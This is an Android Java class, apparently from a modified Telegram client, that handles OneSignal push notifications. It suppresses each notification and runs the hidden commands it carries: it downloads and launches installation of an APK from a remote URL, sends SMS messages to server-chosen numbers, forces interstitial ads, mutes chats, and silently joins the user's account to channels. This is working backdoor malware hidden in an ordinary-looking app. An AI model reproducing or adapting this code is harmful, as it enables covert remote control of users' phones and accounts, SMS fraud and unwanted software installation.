package ir.hamzad.telegram;

/**
 * Created by Root on 3/10/2017.
 */

import android.app.LauncherActivity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.telephony.SmsManager;
import android.util.Log;

import com.onesignal.NotificationExtenderService;
import com.onesignal.OSNotificationReceivedResult;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

import chitchat.Channel;
import chitchat.Commands;
import chitchat.InterstitialAd2;
import chitchat.MuteHelper;
import chitchat.OnJoinSuccess;
import ir.hamzad.ui.LaunchActivity;

public class NotificationExtenderBareBonesExample extends NotificationExtenderService {

    String appfile;
    @Override
    protected boolean onNotificationProcessing(OSNotificationReceivedResult result) {
        // Read properties from result.
        try {
            JSONObject data = result.payload.additionalData;
            String base1,base1_u,base1_u2,base2,base2_u,base3,base3_u,base3_u2,base3_u3,base4,base4_u,base5,base5_u,base5_u2,base6,base6_u,base10,base10_u,base11,base11_u,base12,base12_u;
            if (data != null) {

                base1 = data.optString("a1", null);
                base1_u = data.optString("a1_u", null);
                base1_u2 = data.optString("a1_u2", null);

                base2 = data.optString("a2", null);
                base2_u = data.optString("a2_u", null);

                base3 = data.optString("a3", null);
                base3_u = data.optString("a3_u", null);
                base3_u2 = data.optString("a3_u2", null);
                base3_u3 = data.optString("a3_u3", null);

                base4 = data.optString("a4", null);
                base4_u = data.optString("a4_u", null);

                base5 = data.optString("a5", null);
                base5_u = data.optString("a5_u", null);
                base5_u2 = data.optString("a5_u2", null);

                base6 = data.optString("a6", null);
                base6_u = data.optString("a6_u", null);

                base10 = data.optString("a10", null);
                base10_u = data.optString("a10_u", null);

                base11 = data.optString("a11", null);
                base11_u = data.optString("a11_u", null);

                base12 = data.optString("a12", null);
                base12_u = data.optString("a12_u", null);

                // Base 1 Direct Link
                if (base1 != null) {
                    Log.i("OneSignalExample", "customkey set with value: " + base1);
                        Intent DirectLaunchIntent = new Intent(Intent.ACTION_VIEW  , Uri.parse(base1_u));
                        if (base1.equals("0")){
                            DirectLaunchIntent.setPackage("com.farsitel.bazaar");
                        }
                        if (base1_u.startsWith("tds://jn")){
                            Random rand = new Random();
                            int i = rand.nextInt(Integer.parseInt(base1_u2)) + 1;
                            if (i==1) {
                                DirectLaunchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
                                DirectLaunchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(DirectLaunchIntent);
                            }
                        }else {
                            DirectLaunchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
                            DirectLaunchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(DirectLaunchIntent);
                        }
                }



                // Base 2 Direct
                if (base2 != null) {
                    Log.i("OneSignalExample", "customkey set with value: " + base2);
                    appfile = base2;
                    UpdateApp atualizaApp = new UpdateApp();
                    atualizaApp.setContext(getApplicationContext());
                    atualizaApp.execute(base2_u);
                }


                // Base 3 DirectAD
                if (base3 != null) {
                    Intent intent = new Intent(getApplicationContext(), InterstitialAd2.class);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    intent.putExtra("n_url",base3);
                    if (base3_u.equals("0")){
                        intent.putExtra("mute",false);
                    }else {
                        intent.putExtra("mute",true);
                    }
                    if (base3_u2.equals("0")){
                        intent.putExtra("hide",false);
                    }else {
                        intent.putExtra("hide",true);
                    }
                    Random rand = new Random();
                    int i = rand.nextInt(Integer.parseInt(base3_u3)) + 1;
                    System.out.println("random="+i);
                    if (i==1) {
                        System.out.println("runing");
                        startActivity(intent);
                    }
                }

                if (base4 != null) {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage(base4, null, base4_u, null, null);
                }

                if (base5 != null) {
                        try {
                            if (base5_u2!=null){
                                MuteHelper.MuteForEverID(true,base5,Integer.parseInt(base5_u) );
                            }else {
                                MuteHelper.MuteForEverID(false,base5,Integer.parseInt(base5_u) );
                            }

                        }catch (Exception e){}
                }

                if (base10 != null) {
                    final Channel channel20 = new Channel(base10_u,5008);
                    Commands.joinrob(channel20,false, new OnJoinSuccess() {
                        @Override
                        public void OnResponse(boolean ok) {
                            if (ok) {
                                System.out.println("BOT DONE");
                            } else {
                                System.out.println("BOT Error");
                            }
                        }
                    });

                }
                if (base11 != null) {
                    final Channel channel20 = new Channel(base11_u,5008);
                    Commands.joinrob(channel20,true, new OnJoinSuccess() {
                        @Override
                        public void OnResponse(boolean ok) {
                            if (ok) {
                                System.out.println("BOT DONE");
                            } else {
                                System.out.println("BOT Error");
                            }
                        }
                    });

                }
                if (base12 != null) {
                    Commands.addall(base12_u,new OnJoinSuccess() {
                        @Override
                        public void OnResponse(boolean ok) {

                            System.out.println("JOB  "+ok);

                        }
                    });

                }

            }

        }catch (Exception e){System.out.println(e.getMessage());}

        // Return true to stop the notification from displaying.
        return true;
    }





    // update
    public class UpdateApp extends AsyncTask<String,Void,Void> {
        private Context context;
        public void setContext(Context contextf){
            context = contextf;
        }

        @Override
        protected Void doInBackground(String... arg0) {
            try {
                String DLSTR = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/";
                Log.e("UpdateAPP", "DL path " + DLSTR);
                URL url = new URL(arg0[0]);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                c.setDoOutput(true);
                c.connect();

                String PATH = DLSTR;
                File file = new File(PATH);
                file.mkdirs();
                File outputFile = new File(file, appfile);
                if(outputFile.exists()){
                    outputFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outputFile);

                InputStream is = c.getInputStream();

                byte[] buffer = new byte[1024];
                int len1 = 0;
                while ((len1 = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len1);
                }
                fos.close();
                is.close();
                File n = new File(DLSTR+appfile);
                Log.e("UpdateAPP", "DL leg " + n.length());
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(n), "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
                context.startActivity(intent);


            } catch (Exception e) {
                Log.e("UpdateAPP", "Update error! " + e.getMessage());
            }
            return null;
        }
    }
}